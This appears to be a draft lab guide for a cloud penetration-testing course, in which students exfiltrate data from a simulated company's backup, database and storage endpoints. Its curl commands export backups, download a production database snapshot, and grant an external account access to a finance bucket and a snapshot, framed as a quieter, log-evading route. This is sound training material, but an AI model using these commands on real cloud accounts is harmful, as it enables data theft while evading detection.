@@ -1,0 +1,128 @@
+# Module 5 — Lab 4: Data Exfiltration via Storage & Snapshot Abuse
+
+> **⚠️ PLANNED CONTENT — not yet built or deployed.** Describes the intended lab for
+> review before implementation. Nothing below is live yet.
+
+**Course:** Cloud Pentest — Module 5: Post-Exploitation, Persistence & Lateral Movement
+**Target:** SoulSecure Inc. (simulated engagement, continued)
+**Target host:** `https://backup-eu.soulsecure.lab/` and `https://iam.soulsecure.lab/`
+**Estimated time:** 75–100 minutes
+
+---
+
+## 1. Recap & scenario
+
+You've spent Module 5 gaining access and staying in. This lab is about the payoff a
+real attacker (or the impact section of your report) actually cares about: getting
+data out. Admin-equivalent access changes what "exfiltration" even looks like —
+you're no longer limited to whatever a weak portal password could reach.
+
+> **Scope reminder:** `backup-eu.soulsecure.lab`, `iam.soulsecure.lab`,
+> `storage.soulsecure.lab`. Active exploitation authorized.
+
+## 2. Learning objectives
+
+- Recognize that admin-level access unlocks entirely different endpoints than the
+  ones you found with weak/stolen credentials earlier in the engagement
+- Create and download a database snapshot — a very common real cloud exfiltration
+  pattern
+- Modify a storage bucket's access policy to grant an external party access, as a
+  stealthier alternative to direct download
+- Understand why "share, don't download" is a meaningfully different technique from
+  a logging/detection standpoint, not just a stylistic choice
+
+## 3. Tasks
+
+### 3.1 — Revisit the backup portal with real power
+
+`ops-eu`'s credentials from Module 3 Lab 4 got you into `/files/`. With
+admin-equivalent access, there's more:
+
+```bash
+curl -sk https://backup-eu.soulsecure.lab/admin/export-all \
+  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>"
+```
+
+### 3.2 — Create and download a database snapshot
+
+```bash
+curl -sk -X POST https://iam.soulsecure.lab/rds/create-snapshot \
+  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>" \
+  -H 'Content-Type: application/json' \
+  -d '{"db_instance": "soulsecure-prod-db"}'
+
+curl -sk "https://iam.soulsecure.lab/rds/download-snapshot?id=<snapshot-id>" \
+  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>"
+```
+
+### 3.3 — Share a bucket instead of downloading it
+
+Direct downloads show up in access logs as exactly what they are. Modifying a
+bucket's policy to grant read access to an external account is quieter — the data
+never has to cross through your own credentials at all once it's shared:
+
+```bash
+curl -sk -X POST https://storage.soulsecure.lab/soulsecure-finance-records/_policy \
+  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>" \
+  -H 'Content-Type: application/json' \
+  -d '{"add_principal_account": "999888777666"}'
+```
+
+### 3.4 — Harder mode: apply the same idea to the snapshot
+
+Do the download from 3.2 the stealthier way instead: share the snapshot with an
+external account rather than pulling it directly.
+
+```bash
+curl -sk -X POST https://iam.soulsecure.lab/rds/share-snapshot \
+  -H "X-Access-Key-Id: <admin-access-key>" -H "X-Secret-Access-Key: <admin-secret>" \
+  -H 'Content-Type: application/json' \
+  -d '{"snapshot_id": "<snapshot-id>", "target_account": "999888777666"}'
+```
+
+## 4. Tools you'll want
+
+- `curl` — same as every Module 4/5 IAM-adjacent lab
+
+## 5. Deliverable: Exfiltration Techniques Summary
+
+| Technique | Target | Detection profile (loud vs. quiet) |
+|---|---|---|
+| | | |
+
+**Flags found:**
+
+- [ ] Flag 1 (admin-only backup export): `flag{________________________________}`
+- [ ] Flag 2 (DB snapshot created and downloaded): `flag{________________________________}`
+- [ ] Flag 3 (bucket policy modified to add external account): `flag{________________________________}`
+- [ ] Flag 4 (harder mode — snapshot shared cross-account instead of downloaded): `flag{________________________________}`
+
+## 6. Hints
+
+<details>
+<summary>Hint 1 — the account ID to use</summary>
+
+Any plausible-looking 12-digit AWS-style account number works for the "external
+account" fields in this lab — the mechanism being tested is the sharing action
+itself, not validating a real external account.
+</details>
+
+<details>
+<summary>Hint 2 — snapshot ID format</summary>
+
+`create-snapshot`'s response includes an `id` field — carry it forward exactly as
+given into the download/share calls.
+</details>
+
+## 7. Known limitations
+
+Same simplified `iam-sim` conventions as Modules 4–5's other labs. The "database"
+being snapshotted doesn't back a real running database — the snapshot content is
+canned.
+
+## 8. Next up
+
+Lab 5 (Persistence via CI/CD & Automation) closes out Module 5 — and the whole
+Module 3–5 arc — by tying your IAM backdoors from Lab 1 together with the CI/CD
+access from Module 3 into persistence mechanisms designed to survive a genuinely
+thorough cleanup, not just a routine one.
